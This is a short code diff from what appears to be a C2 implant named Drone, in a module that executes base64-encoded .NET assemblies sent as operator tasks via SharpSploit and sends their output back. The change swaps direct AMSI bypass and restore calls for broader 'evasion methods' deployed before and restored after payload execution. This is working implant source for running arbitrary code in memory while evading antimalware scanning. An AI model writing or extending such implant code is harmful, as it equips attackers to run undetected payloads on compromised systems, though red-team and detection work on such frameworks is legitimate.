@@ -22,6 +22,8 @@ namespace Drone.Modules
 
         private void ExecuteAssembly(DroneTask task, CancellationToken token)
         {
+            Evasion.DeployEvasionMethods();
+
             var asm = Convert.FromBase64String(task.Artefact);
             var ms = new MemoryStream();
             
@@ -36,11 +38,9 @@ namespace Drone.Modules
             Console.SetOut(stdOutWriter);
             Console.SetError(stdErrWriter);
             
-            Evasion.BypassAmsi();
+            
                 
             SharpSploit.Execution.Assembly.Execute(asm, task.Arguments);
-            
-            Evasion.RestoreAmsi();
                 
             Console.Out.Flush();
             Console.Error.Flush();
@@ -49,7 +49,9 @@ namespace Drone.Modules
 
             var result = Encoding.UTF8.GetString(ms.ToArray());
             ms.Dispose();
-            
+
+            Evasion.RestoreEvasionMethods();
+
             Drone.SendResult(task.TaskGuid, result);
         }
     }
